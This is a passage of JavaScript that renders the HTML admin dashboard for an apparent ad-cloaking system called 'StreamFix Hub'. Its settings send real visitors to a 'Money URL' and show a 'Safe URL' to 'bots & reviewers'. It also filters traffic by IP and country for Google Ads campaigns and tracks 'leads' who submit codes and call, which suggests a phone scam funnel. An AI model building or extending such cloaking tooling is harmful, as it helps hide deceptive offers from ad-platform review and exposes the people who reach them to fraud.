table{width:100%;border-collapse:collapse;font-size:0.76rem}
th{text-align:left;padding:8px 10px;color:#a78bfa;border-bottom:1px solid #2e1655;font-weight:600;white-space:nowrap;background:#120824;position:sticky;top:0}
td{padding:6px 10px;border-bottom:1px solid #160928;color:#ccc;white-space:nowrap}
td.mono{font-family:'SF Mono',Menlo,monospace;font-size:0.72rem;color:#888}
td.ua{max-width:180px;overflow:hidden;text-overflow:ellipsis;color:#777}
td.isp{max-width:140px;overflow:hidden;text-overflow:ellipsis;color:#9ca3af}
td.allow{color:#4ade80;font-weight:700}
td.block{color:#f87171;font-weight:700}
tr:hover td{background:rgba(124,58,237,0.07)}

/* ── Reason pills (table) ── */
.rpill{display:inline-block;padding:2px 9px;border-radius:12px;font-size:0.7rem;font-weight:600}
.rpill-green{background:#14532d;color:#4ade80}
.rpill-orange{background:#431407;color:#fb923c}
.rpill-amber{background:#451a03;color:#fbbf24}
.rpill-red{background:#450a0a;color:#f87171}
.rpill-grey{background:#1c1c2e;color:#888}

.empty{font-size:0.82rem;color:#444;font-style:italic}
.hint{font-size:0.72rem;color:#555;margin-top:6px}
.dl-btn{display:inline-block;padding:10px 20px;background:#1a0d2e;border:1px solid #7c3aed;border-radius:9px;color:#c084fc;font-size:0.85rem;font-weight:700;text-decoration:none;transition:background .2s,border-color .2s}
.dl-btn:hover{background:#2d1060;border-color:#a855f7}
</style>
</head>
<body>

<header>
  <div class="hdr-left">
    <h1>&#9680; StreamFix Hub — Cloaking Admin</h1>
    <div class="hdr-urls">
      Money URL: <span>${escHtml(settings.moneyUrl || '—')}</span>
      &nbsp;&nbsp;|&nbsp;&nbsp;
      Safe URL: <span>${escHtml(settings.safeUrl || '—')}</span>
    </div>
  </div>
  <div class="hdr-right">
    <span class="hdr-time">Last updated: ${timeStr} UTC</span>
    <form method="POST" action="/admin/clear-leads" class="inline" onsubmit="return confirm('Clear all leads?')">
      <button type="submit" class="btn-danger btn-sm">Clear Leads</button>
    </form>
    <form method="POST" action="/admin/clear-logs" class="inline" onsubmit="return confirm('Clear all logs?')">
      <button type="submit" class="btn-danger btn-sm">Clear Logs</button>
    </form>
    <a href="/admin/logout">Sign out</a>
  </div>
</header>

<div class="container">

  <!-- Row 1: Engine + Stats -->
  <div class="grid2">

    <div class="card">
      <h2>Cloaking Engine</h2>
      <div class="toggle-row">
        ${statusBadge}
        <p>Traffic filtering is ${settings.enabled ? 'active' : 'inactive'}</p>
      </div>
      <form method="POST" action="/admin/toggle" class="inline">
        <button type="submit" class="${settings.enabled ? 'btn-danger' : 'btn-success'}">${toggleLabel}</button>
      </form>
    </div>

    <div class="card">
      <h2>Traffic Stats</h2>
      <div class="stats-row">
        <div class="stat"><span class="num allow-num">${todayAllow}</span><span class="lbl">Today Allowed</span></div>
        <div class="stat"><span class="num block-num">${todayBlock}</span><span class="lbl">Today Blocked</span></div>
        <div class="stat"><span class="num total-num">${todayTotal}</span><span class="lbl">Today Total</span></div>
      </div>
      <div class="stats-row">
        <div class="stat"><span class="num allow-num" style="font-size:1.3rem">${allAllow}</span><span class="lbl">All-time Allowed</span></div>
        <div class="stat"><span class="num block-num" style="font-size:1.3rem">${allBlock}</span><span class="lbl">All-time Blocked</span></div>
        <div class="stat"><span class="num rate-num" style="font-size:1.3rem">${blockRate}%</span><span class="lbl">Block Rate</span></div>
      </div>
    </div>

  </div>

  <!-- Row 2: Top Countries + Block Reasons + URL Settings -->
  <div class="grid3">

    <div class="card">
      <h2>Top Countries</h2>
      ${countryRows}
    </div>

    <div class="card">
      <h2>Block Reasons</h2>
      <div class="pills-wrap">${reasonPills}</div>
    </div>

    <div class="card">
      <h2>URL Settings</h2>
      <form method="POST" action="/admin/settings">
        <label for="moneyUrl">Money URL — real visitors see this</label>
        <input type="text" id="moneyUrl" name="moneyUrl" value="${escHtml(settings.moneyUrl || '')}" placeholder="https://your-offer-url.com">
        <label for="safeUrl">Safe URL — bots &amp; reviewers see this</label>
        <input type="text" id="safeUrl" name="safeUrl" value="${escHtml(settings.safeUrl || '/safe')}" placeholder="/safe">
        <button type="submit" class="btn-primary" style="margin-top:16px;width:100%">Save URLs</button>
      </form>
    </div>

  </div>

  <!-- Row 3: Traffic Controls (full width) -->
  <div class="grid3" style="margin-bottom:18px">

    <div class="card">
      <h2>Blocked IPs</h2>
      <div class="tc-meta">
        <div class="tc-chip">Permanently blocked: <strong>${blockedIpsList.length}</strong> IP${blockedIpsList.length !== 1 ? 's' : ''}</div>
        <div class="tc-chip" title="Logged repeat-click blocks in last 24h — does not reset when tracker is cleared">Repeat-click blocks (log, 24h): <strong>${repeatClicksIn24h}</strong></div>
        <div class="tc-chip">Active tracker (unique IPs): <strong>${freqStoreSize}</strong>
          &nbsp;<form method="POST" action="/admin/clear-frequency" class="inline" onsubmit="return confirm('Reset the repeat-click tracker? Tracked IPs will be allowed once more, but log counts are unchanged.')">
            <button type="submit" class="btn-danger btn-sm" style="padding:2px 8px;font-size:0.7rem">Reset Tracker</button>
          </form>
        </div>
      </div>
      <form method="POST" action="/admin/blocked-ips">
        <label for="blockedIps">Paste IPs to permanently block (one per line)</label>
        <textarea id="blockedIps" name="blockedIps" rows="6" placeholder="1.2.3.4&#10;5.6.7.8&#10;...">${escHtml(blockedIpsList.join('\n'))}</textarea>
        <p class="hint">Get these from your Google Ads campaign &rarr; Audiences tab &rarr; IP addresses column</p>
        <button type="submit" class="btn-primary" style="margin-top:12px;width:100%">Save Blocked IPs</button>
      </form>
    </div>

    <div class="card">
      <h2>Country Filter</h2>
      <div class="tc-meta">
        <div class="tc-chip">
          ${allowedCountriesList.length > 0
            ? 'Allowing: <strong>' + escHtml(allowedCountriesList.join(', ')) + '</strong>'
            : '<strong>All countries</strong> allowed (no filter)'}
        </div>
      </div>
      <form method="POST" action="/admin/allowed-countries">
        <label for="allowedCountries">Allowed country codes (comma or space separated)</label>
        <input type="text" id="allowedCountries" name="allowedCountries"
          value="${escHtml(allowedCountriesList.join(', '))}"
          placeholder="US, CA, GB — leave blank to allow all">
        <p class="hint">Use 2-letter ISO codes. Leave blank to allow all countries. Example: US CA GB AU</p>
        <button type="submit" class="btn-primary" style="margin-top:12px;width:100%">Save Country Filter</button>
      </form>
      ${allowedCountriesList.length > 0 ? '<form method="POST" action="/admin/allowed-countries" class="inline" style="margin-top:8px;display:block"><input type="hidden" name="allowedCountries" value=""><button type="submit" class="btn-danger btn-sm" style="width:100%;margin-top:8px" onclick="return confirm(\'Remove country filter?\')">Remove Filter (Allow All)</button></form>' : ''}
    </div>

    <div class="card">
      <h2>How Click Fraud Protection Works</h2>
      <div style="font-size:0.78rem;color:#777;line-height:1.7">
        <p style="margin-bottom:8px"><span style="color:#fb923c;font-weight:600">Repeat Click</span> — same IP within 24 hours is automatically blocked. Resets daily.</p>
        <p style="margin-bottom:8px"><span style="color:#fb923c;font-weight:600">Manual Block</span> — IPs you paste above are permanently refused. Find them in Google Ads &rarr; Reports &rarr; IP addresses.</p>
        <p style="margin-bottom:8px"><span style="color:#fb923c;font-weight:600">Country Block</span> — if you set a country filter, visitors whose country does not match are blocked after geolocation. Use this to restrict traffic to countries where your customers actually are.</p>
        <p style="color:#555;font-size:0.7rem">Tip: also add competitor IPs directly to Google Ads under Campaign Settings &rarr; IP Exclusions — this blocks them before they even click your ad.</p>
      </div>
    </div>

  </div>

  <!-- Google Ads IP Export -->
  <div class="card" style="margin-bottom:18px">
    <h2>Stop Bad Visitors — Export &amp; Block Options</h2>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px">

      <div>
        <p style="font-size:0.82rem;color:#ccc;margin-bottom:10px">
          Download every IP this system has ever blocked — both manually added ones and auto-detected bots/fraud — as a plain text file. Then paste the list into Google Ads to stop those visitors from ever seeing your ad again.
        </p>
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:14px">
          <span style="font-size:0.78rem;color:#888">Unique public IPs ready to export:</span>
          <span style="font-size:1.3rem;font-weight:800;color:#f87171">${exportCount}</span>
        </div>
        <a href="/admin/blocked-ips-export" download="blocked-ips.txt" class="dl-btn">&#8681; Download blocked-ips.txt</a>
      </div>

      <div style="font-size:0.78rem;color:#777;line-height:1.8">
        <p style="color:#a78bfa;font-weight:700;margin-bottom:8px;font-size:0.8rem">How to use the downloaded file</p>
        <p style="margin-bottom:6px"><span style="color:#fb923c;font-weight:600">Google Ads (most effective)</span><br>
          Ads &rarr; your campaign &rarr; Settings &rarr; <em>IP exclusions</em>. Paste the IPs one per line. This stops fraud clicks <em>before</em> they reach your site and saves your ad budget.</p>
        <p style="margin-bottom:6px"><span style="color:#fb923c;font-weight:600">Manual block on this site</span><br>
          Paste the same IPs into the "Blocked IPs" card above — they'll be instantly refused at the door.</p>
        <p><span style="color:#fb923c;font-weight:600">Railway firewall (optional)</span><br>
          In Railway &rarr; your service &rarr; Networking you can block IPs at the infrastructure level, before they touch the server.</p>
      </div>

    </div>
  </div>

  <!-- Leads -->
  <div class="card" style="margin-bottom:18px">
    <h2>Leads — Code Submissions</h2>
    <div class="stats-row" style="margin-bottom:16px">
      <div class="stat"><span class="num allow-num">${todaySubmits.length}</span><span class="lbl">Today</span></div>
      <div class="stat"><span class="num total-num">${submits.length}</span><span class="lbl">All-time</span></div>
      <div class="stat"><span class="num" style="color:#c084fc">${calledLeads.length}</span><span class="lbl">Called</span></div>
      <div class="stat"><span class="num rate-num">${callRate}%</span><span class="lbl">Call Rate</span></div>
    </div>
    <div class="log-wrap">
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Location</th>
            <th>Device</th>
            <th>Code</th>
            <th>Ad Source</th>
            <th>Called</th>
          </tr>
        </thead>
        <tbody>
          ${leadRows || '<tr><td colspan="7" style="text-align:center;color:#444;padding:24px">No leads yet</td></tr>'}
        </tbody>
      </table>
    </div>
  </div>

  <!-- Decision Log -->
  <div class="card">
    <h2>Decision Log — Last ${Math.min(logs.length, 150)} entries (auto-refreshes every 60s)</h2>
    <div class="log-wrap">
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Location</th>
            <th>ISP</th>
            <th>Screen</th>
            <th>Device</th>
            <th>User Agent</th>
            <th>Decision</th>
            <th>Reason</th>
          </tr>
        </thead>
        <tbody>
          ${logRows || '<tr><td colspan="9" style="text-align:center;color:#444;padding:24px">No entries yet</td></tr>'}
        </tbody>
      </table>
    </div>
  </div>

</div>
</body>
</html>`;
}

function escHtml(str) {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
